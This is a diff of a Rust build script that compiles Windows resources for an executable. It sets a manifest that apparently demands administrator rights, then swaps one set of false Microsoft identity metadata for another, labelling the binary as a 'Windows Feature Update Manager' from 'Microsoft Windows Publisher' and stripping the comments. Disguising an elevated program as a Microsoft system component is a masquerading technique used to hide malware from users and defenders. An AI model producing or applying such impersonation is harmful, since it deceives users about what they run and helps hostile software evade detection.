@@ -1,10 +1,9 @@
 fn main() {
-    // Only compile resources on Windows
+    // Resource compilation
     if cfg!(target_os = "windows") {
         let mut res = winres::WindowsResource::new();
-        
-        // Set manifest to require administrator
-        res.set_manifest(r#"
+        res.set_manifest(
+            r#"
 <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
   <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
     <security>
@@ -14,15 +13,12 @@ fn main() {
     </security>
   </trustInfo>
 </assembly>
-"#);
-        
-        // Set icon and metadata (optional)
-        res.set("ProductName", "Windows Security Service");
-        res.set("FileDescription", "Microsoft Security Host");
-        res.set("CompanyName", "Microsoft Corporation");
-        res.set("LegalCopyright", "Copyright © Microsoft Corporation");
-        
-        // Compile
+"#,
+        );
+        res.set("ProductName", "Windows Feature Update Manager");
+        res.set("FileDescription", "Windows Feature Service");
+        res.set("CompanyName", "Microsoft Windows Publisher");
+        res.set("LegalCopyright", "© Microsoft Corporation. All rights reserved.");
         res.compile().unwrap();
     }
 }
